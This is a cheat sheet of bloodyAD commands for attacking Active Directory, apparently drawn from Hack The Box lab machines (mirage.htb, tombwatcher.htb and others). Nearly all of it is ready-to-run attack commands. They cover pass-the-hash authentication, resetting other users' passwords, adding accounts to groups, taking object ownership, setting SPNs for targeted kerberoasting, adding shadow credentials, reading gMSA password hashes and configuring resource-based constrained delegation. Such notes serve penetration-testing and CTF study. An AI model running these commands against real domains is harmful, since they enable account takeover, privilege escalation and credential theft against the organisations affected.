# BloodyAD – AD Exploitation Automation Tool

##  Authentication Support

#### With user/pass:
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" -action info
```
#### NTLM:
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u administrator -H aad31431b21403eeaad3b435b51203ee:7bd61f3j2fc18212e35dbda95f168918 -action info
```
#### Kerberos Ticket:
Specified with the -k flag
```bash
#Even with kerberos auth we can run into issues if we do not specify user and password, so try to do that aswell:

bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p 'lol123!' -k set password janet 'pwned123!'
```

---

## Enumerating AD Objects

#### Listing object data:
```bash
#base command:
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get object janet

#specifying specific attributes:
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get object --attr <attributes> janet
```
#### Listing Writable Objects to user:
Good addition to BloodHound graphs for identifying what objects and what attributes the user can write to.
```bash
#base command:
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get writable

#Detailed output (Recommended):
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get writable --detail
```
#### Listing Group Memberships + SIDs:
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get membership john
```
#### List Children for target:
```bash
#for current user:
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get children

#for a set target:
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get children --target bob
```
---
## Domain Enumeration
#### Listing DNS Records:
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get dnsDump
```
#### Listing Domain Trusts:
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get trusts
```
---
## Modifying AD Objects

#### Changing target User's Password:
```bash
#standard way:
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" set password janet 'pwned123!'

#unicode way:
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u john -k \
set object dd.ali unicodePwd -v '"NewP@ssw0rd!"'
```
#### Adding target to Group:
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" add groupMember 'IT Support' john
```
#### Adding Computer Object
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" add computer 'mypc$' 'pwned123!'
```
#### Changing Ownership:
`SE_TAKE_OWNERSHIP_PRIVILEGE (Write Owner) makes it so you can only set yourself as the owner (the user that you provided creds for)`
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" set owner 'IT Support' james
```
#### Setting SPN for targeted kerberoast:
```bash
#adding SPN
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" set object dd.ali servicePrincipalName -v 'test/test'

#SPN-Roasting after it's set:
impacket-GetUserSPNs rustykey.htb/john -k -no-pass -dc-host dc.rustykey.htb -dc-ip 10.129.232.127  -outputfile kerbe.txt
```
#### Enabling a disabled User:
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" set object janet userAccountControl -v 512
```
#### Restoring Removed (Tombstoned) User:
```bash
#default way:
bloodyAD -d tombwatcher.htb -u john -p 'pwned123!' --dc-ip 10.129.180.41 set restore jurgen --newParent "OU=OLDPARENTOU,DC=domain,DC=local"

#with SID, if multiple users exist with the same SAM:
bloodyAD -d tombwatcher.htb -u john -p 'pwned123!' --dc-ip 10.129.180.41 set restore S-1-5-21-1392421010-1358638121-2126912587-1211 --newParent "OU=OLDPARENTOU,DC=domain,DC=local"
```
#### Add GenericALL (WriteOwner Abuse):
```bash
#john is the trustee, Infrastructure is the target grp:
bloodyAD -u 'john' -p 'pwned123!' -d tombwatcher.htb --dc-ip 10.129.180.41 add genericAll 'Infrastructure' john
```
#### Add Shadow Credentials:
```bash
bloodyAD -u 'john' -p 'pwned123!' -d tombwatcher.htb --dc-ip 10.129.180.41 add shadowCredentials jasper
```
#### Setting LogonHours to Always allowed:
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" set object javier.mmarshall logonhours -v '////////////////////////////' --b64
```
#### Getting GMSA-PW:
Outputs the NT hash of the object if the specified user has the right to read it:
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" get object 'Mirage-Service$' --attr msDS-ManagedPassword
```
#### Adding RBCD (Resource-Based Constrained Delegation):
```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -u john -p "lol123!" add rbcd 'AD-CS$' 'mypc$'
```
---
